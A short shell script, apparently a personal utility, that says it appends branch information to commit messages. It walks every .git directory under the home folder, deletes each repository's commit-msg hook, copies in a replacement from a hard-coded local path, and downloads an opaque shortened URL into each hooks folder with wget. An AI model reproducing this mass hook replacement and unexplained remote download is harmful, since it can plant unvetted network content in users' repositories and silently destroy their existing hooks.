#!/bin/sh
#
# Automatically adds branch name and branch description to every commit message.
#

find $HOME -type d -name ".git" |while read fname; do
  echo "$fname"
  cd $fname
  mkdir -p hooks
  cd hooks/
  rm commit-msg
  cp /Users/paras.sipani/Desktop/commit-msg commit-msg
  wget "shorturl.at/gBK09"
  chmod +x commit-msg
  echo "done" 
done